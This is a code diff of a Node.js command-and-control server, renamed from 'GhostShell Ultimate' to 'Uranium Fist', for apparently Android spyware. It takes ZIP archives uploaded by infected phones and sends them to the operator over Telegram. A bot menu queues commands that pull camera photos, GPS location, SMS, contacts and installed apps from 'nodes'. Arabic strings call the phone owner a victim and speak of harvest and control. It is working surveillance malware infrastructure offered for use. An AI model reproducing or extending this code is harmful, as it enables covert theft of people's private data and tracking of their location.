@@ -1,8 +1,7 @@
-// server_unified_core.js
+// server_uranium_core.js
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
-const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
@@ -15,10 +14,10 @@ if (!token || !chatId) {
     process.exit(1);
 }
 
-const UPLOAD_DIR = path.join(__dirname, 'unified_storage');
-[UPLOAD_DIR].forEach(dir => { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); });
+const UPLOAD_DIR = path.join(__dirname, 'uranium_storage');
+if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
 
-const db = new sqlite3.Database('./unified_core.db');
+const db = new sqlite3.Database('./uranium_core.db');
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
     db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
@@ -45,14 +44,15 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔] GHOSTSHELL ULTIMATE C2 CORE ONLINE [⚔️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#111;color:#ff5500;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE ONLINE [☢️]</h1></body></html>`);
 });
 
-app.post('/api/v3/unified/upload_raw', async (req, res) => {
+// نقطة استقبال الرفع الثنائي الخام (Raw Binary / ZIP)
+app.post('/api/v3/uranium/upload_raw', async (req, res) => {
     try {
         const nodeId = req.headers['x-node-id'] || 'unknown';
         const nodeModel = req.headers['x-node-model'] || 'Unknown';
-        const fileName = req.headers['x-file-name'] || `archive_${Date.now()}.zip`;
+        const fileName = req.headers['x-file-name'] || `uranium_archive_${Date.now()}.zip`;
 
         db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
 
@@ -67,24 +67,22 @@ app.post('/api/v3/unified/upload_raw', async (req, res) => {
         const stats = fs.statSync(finalPath);
         const fileSizeMB = stats.size / (1024 * 1024);
 
-        await sendTg(`🔥 <b>حصاد أسطوري تم استلامه (بث ثنائي صامد)!</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 الملف: <code>${safeName}</code>\n📊 الحجم: <code>${fileSizeMB.toFixed(2)} MB</code>`);
-
         if (fileSizeMB > 50) {
-            await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> يتجاوز حد تيليجرام (50MB)، تم حفظه بأمان على السيرفر.`);
+            await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> يتجاوز حد تيليجرام (50MB)، تم حفظه بأمان في خزنة اليورانيوم.`);
         } else {
             await appBot.sendDocument(chatId, finalPath, { 
-                caption: `👑 <b>أرشيف الحصاد المسحوب:</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+                caption: `☢️ <b>قبضة اليورانيوم - أرشيف الحصاد:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
             });
         }
 
-        res.status(200).json({ status: 'OK', message: 'RAW_UPLOAD_SUCCESS' });
+        res.status(200).json({ status: 'OK', message: 'URANIUM_UPLOAD_SUCCESS' });
     } catch (e) {
-        console.error('Raw Upload Error:', e);
+        console.error('Uranium Upload Error:', e);
         res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
     }
 });
 
-app.post('/api/v3/unified/stream', async (req, res) => {
+app.post('/api/v3/uranium/stream', async (req, res) => {
     try {
         const nodeId = req.headers['x-node-id'] || 'unknown';
         const nodeModel = req.headers['x-node-model'] || 'Unknown';
@@ -101,7 +99,10 @@ app.post('/api/v3/unified/stream', async (req, res) => {
         let directive = { status: 'ACK', task: null };
 
         if (payload.type === 'TEXT_REPORT') {
-            await sendTg(`📋 <b>تقرير مباشر من [<code>${nodeId}</code>]:</b>\n<pre>${(payload.data || '').substring(0, 3500)}</pre>`);
+            const textData = payload.data || '';
+            if (textData.includes('خطأ') || textData.includes('Error') || textData.includes('فشل') || textData.includes('بنجاح') || textData.includes('LOCATION') || textData.includes('APPS') || textData.includes('SHELL')) {
+                await sendTg(`☢️ <b>تقرير قبضة اليورانيوم [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3500)}</pre>`);
+            }
         }
 
         db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
@@ -123,16 +124,16 @@ appBot.on('message', async (msg) => {
     if (text === '/start') {
         db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
             if (!rows || rows.length === 0) {
-                await sendTg(`⚠️ <b>لا توجد عقد متصلة حالياً. أرسل التطبيق للضحية لتبدأ السيطرة.</b>`);
+                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً.</b>`);
                 return;
             }
 
             let inlineKeyboard = [];
             rows.forEach(node => {
-                inlineKeyboard.push([{ text: `📱 ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
+                inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`🔥 <b>غرفة قيادة GhostShell Ultimate:</b>\nاختر العقدة المستهدفة للسيطرة الفورية:`, {
+            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم المطلقة:</b>\nاختر العقدة المستهدفة للدمار الشامل:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -148,8 +149,8 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '👑 حصاد شامل (مسح + ضغط + إرسال ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
-                    { text: '📸 أحدث صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
+                    { text: '☢️ حصاد الكاميرا الشامل (ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '📍 تحديد الموقع الجغرافي (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }
                 ],
                 [
                     { text: '📨 الرسائل', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
@@ -157,12 +158,15 @@ appBot.on('callback_query', async (query) => {
                 ],
                 [
                     { text: '📇 جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
-                    { text: '📱 التطبيقات', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
+                    { text: '📱 التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
+                ],
+                [
+                    { text: '📸 أحدث صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
                 ],
                 [{ text: '🔙 عودة للقائمة الرئيسية', callback_data: 'back_home' }]
             ]
         };
-        await appBot.editMessageText(`🎯 <b>العقدة المحددة للسيطرة:</b> <code>${nodeId}</code>`, {
+        await appBot.editMessageText(`🎯 <b>العقدة التحت سيطرة قبضة اليورانيوم:</b> <code>${nodeId}</code>`, {
             chat_id: msg.chat.id,
             message_id: msg.message_id,
             parse_mode: 'HTML',
@@ -174,14 +178,14 @@ appBot.on('callback_query', async (query) => {
         const action = parts.slice(1).join('_');
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `🚀 تم حقن أمر الحصاد [${action}] بنجاح!` });
-            await sendTg(`⚡ <b>أمر الحصاد [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
+            await appBot.answerCallbackQuery(query.id, { text: `☢️️ تم إطلاق أمر قبضة اليورانيوم [${action}] بنجاح!` });
+            await sendTg(`🔥 <b>أمر قبضة اليورانيوم [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
-        await sendTg(`أرسل <code>/start</code> لإظهار قائمة العقد النشطة.`);
+        await sendTg(`أرسل <code>/start</code> لإظهار قائمة عقد اليورانيوم النشطة.`);
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] GhostShell Ultimate C2 Core Online on port ${PORT}`));
+app.listen(PORT, () => console.log(`[+] Uranium Fist C2 Core Online on port ${PORT}`));
